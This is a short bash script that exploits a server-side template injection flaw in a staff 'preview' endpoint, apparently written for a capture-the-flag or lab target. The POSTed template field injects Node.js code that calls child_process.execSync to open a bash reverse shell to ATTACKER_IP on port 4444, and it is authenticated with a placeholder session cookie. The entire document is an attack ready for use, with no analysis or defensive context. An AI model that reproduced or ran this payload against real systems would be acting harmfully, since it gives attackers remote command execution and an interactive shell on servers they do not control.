#!/bin/bash
# Reverse shell via SSTI

curl -s -X POST http://TARGET_IP/staff/preview \
  -H "Cookie: connect.sid=YOUR_COOKIE" \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'").toString() %>"
